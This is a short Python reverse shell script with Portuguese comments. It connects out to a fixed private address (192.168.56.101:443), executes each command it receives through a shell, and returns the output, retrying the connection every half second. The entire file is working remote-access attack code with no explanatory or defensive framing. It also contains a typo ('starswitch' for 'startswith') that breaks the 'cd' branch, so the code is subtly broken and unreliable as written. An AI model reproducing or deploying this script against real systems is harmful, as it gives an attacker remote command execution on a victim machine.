                # Shell Reversa
import os
import socket
import subprocess
import time

# destination IP
IP = "192.168.56.101"
PORT = 443

# realizar conexão
def connect(IP, PORT):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((IP, PORT))
        return c
    except Exception as e:
        print(f'Connection Error: {e}')
        return None

# executar comando e devolver a saída
def cmd(c, data):
    try:
        if data.starswitch("cd "):
            os.chdir(data[3:].strip())
            return
               
        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        c.send(p.stdout.read() + p.stderr.read() + b"\n")
    except Exception as e:
        print(f'CMD function error: {e}')

# escutar
def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            elif data:
                cmd(c, data)
    except Exception as e:
        print(f'Listen function error: {e}')

if __name__ == "__main__":
    try:
        while True:
            client = connect(IP, PORT)
            if client:
                listen(client)
                client.close()
            else:
                time.sleep(.5)
    except KeyboardInterrupt:
        print('Program stopped by the user!')
    except Exception as error:
        print(f'Main connection error: {error}')